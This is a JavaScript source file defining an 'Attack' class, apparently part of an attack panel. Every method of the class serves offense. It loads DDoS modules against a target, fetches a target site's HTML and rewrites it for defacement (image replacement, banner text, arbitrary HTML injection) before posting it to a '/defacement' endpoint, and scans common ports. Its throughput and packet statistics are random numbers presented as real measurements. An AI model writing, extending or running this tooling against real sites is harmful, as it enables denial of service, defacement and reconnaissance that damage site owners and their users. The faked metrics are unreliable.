class Attack {
  constructor(target, type, options = {}) {
    this.target = target;
    this.type = type;
    this.options = options;
    this.startTime = null;
    this.isRunning = false;
    this.stats = {
      mbps: 0,
      packetsSent: 0,
      status: 'Idle',
      timeElapsed: 0,
      errors: 0,
      lastError: null
    };
    this.intervalId = null;
    this.attackInstance = null;
    this.errorThreshold = 5;
    this.maxRetries = 3;
    this.currentRetry = 0;
  }

  async start() {
    if (this.isRunning) return;

    this.isRunning = true;
    this.startTime = Date.now();
    this.stats.status = 'Starting';
    this.stats.errors = 0;
    this.currentRetry = 0;

    await this.executeWithRetry();

    this.intervalId = setInterval(() => {
      this.updateStats();
    }, 1000);
  }

  async executeWithRetry() {
    try {
      await this.executeAttack();
    } catch (error) {
      console.error('Attack failed:', error);
      this.handleAttackError(error);
    }
  }

  async executeAttack() {
    switch (this.type) {
      case 'ddos':
        await this.executeDDoSAttack();
        break;
      case 'defacement':
        await this.executeDefacement();
        break;
      case 'connection':
        await this.executeConnectionAttack();
        break;
      default:
        throw new Error(`Unknown attack type: ${this.type}`);
    }
  }

  stop() {
    if (!this.isRunning) return;

    this.isRunning = false;
    this.stats.status = 'Stopped';
    clearInterval(this.intervalId);

    if (this.attackInstance && this.attackInstance.stop) {
      this.attackInstance.stop();
    }
  }

  async executeDDoSAttack() {
    this.stats.status = 'Initializing DDoS';
    const ddosType = this.options.ddosType;
    if (!ddosType) {
      throw new Error('DDoS type not specified.');
    }

    try {
      const ddosModule = await import(`./ddos/${ddosType}.js`);
      this.ddosAttack = new ddosModule.default(this.target, this.options);
      this.attackInstance = this.ddosAttack;

      this.stats.status = 'DDoSing';
      await this.ddosAttack.start();
    } catch (error) {
      console.error(`Failed to load or start DDoS attack: ${error}`);
      this.handleAttackError(error);
    }
  }

  async executeDefacement() {
    this.stats.status = 'Preparing Defacement';
    try {
      const response = await fetch(this.target, { mode: 'cors' });
      if (!response.ok) {
        this.stats.status = 'Unresponsive';
        this.handleAttackError(new Error(`Target unresponsive: ${response.status}`));
        return;
      }
      let html = await response.text();

      if (this.options.imageReplacement) {
        const imageRegex = /<img.*?src="(.*?)".*?>/gi;
        html = html.replace(imageRegex, `<img src="${this.options.imageReplacement}" alt="Defaced Image">`);
      }

      if (this.options.textModification) {
        const bodyRegex = /(<body.*?>)/i;
        html = html.replace(bodyRegex, `$1<div style="color: red; font-size: 2em; text-align: center;">${this.options.textModification}</div>`);
      }

      if (this.options.htmlInjection) {
        const closingBodyRegex = /(<\/body>)/i;
        html = html.replace(closingBodyRegex, `${this.options.htmlInjection}</body>`);
      }
      this.stats.status = 'Submitting Defacement';

      const submitResponse = await fetch('/defacement', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          target: this.target,
          html: html
        })
      });

      if (!submitResponse.ok) {
        throw new Error(`Defacement submission failed: ${submitResponse.status}`);
      }

      this.stats.status = 'Defaced';
    } catch (error) {
      console.error('Defacement failed:', error);
      this.handleAttackError(error);
    }
  }

  async executeConnectionAttack() {
    this.stats.status = 'Initializing Port Scan';
    const ports = this.options.ports ? this.options.ports.split(',').map(p => parseInt(p.trim())) : [80, 443, 21, 22, 23, 25, 110, 143, 3389];
    let openPorts = [];

    this.attackInstance = {
      stop: () => {
        this.stats.status = 'Port Scan Interrupted';
      }
    };
    for (const port of ports) {
      if (!this.isRunning) break;

      this.stats.status = `Scanning Port ${port}`;
      try {
        const response = await fetch(`/portscan?target=${this.target}&port=${port}`);
        const data = await response.json();
        if (data.open) {
          console.log(`Port ${port} is open`);
          openPorts.push(port);
        }
      } catch (error) {
        console.error(`Error scanning port ${port}:`, error);
        this.handleAttackError(error);
        if (!this.isRunning) break;
      }
    }

    this.stats.status = `Connection Scan Complete. Open ports: ${openPorts.join(', ') || 'None'}`;
  }

  updateStats() {
    if (!this.isRunning) return;
    const now = Date.now();
    this.stats.timeElapsed = Math.floor((now - this.startTime) / 1000);
    this.stats.mbps = Math.random() * 15;
    this.stats.packetsSent += Math.floor(Math.random() * 1500);

    fetch(this.target, { mode: 'no-cors' })
      .then(response => {
        this.stats.status = response.ok ? 'Online' : 'Unresponsive';
      })
      .catch((error) => {
        this.stats.status = 'Offline';
        this.handleAttackError(error);
      });
  }

  handleAttackError(error) {
    this.stats.errors++;
    this.stats.lastError = error.message || 'Unknown error';

    if (this.stats.errors > this.errorThreshold) {
      if (this.currentRetry < this.maxRetries) {
        this.currentRetry++;
        console.log(`Retrying attack (attempt ${this.currentRetry}/${this.maxRetries})...`);
        this.stats.errors = 0;
        this.stats.lastError = null;
        this.executeWithRetry();
      } else {
        console.error('Max retries reached. Stopping attack.');
        this.stats.status = 'Failed';
        this.stop();
      }
    }
  }

  getStats() {
    return this.stats;
  }
}

export default Attack;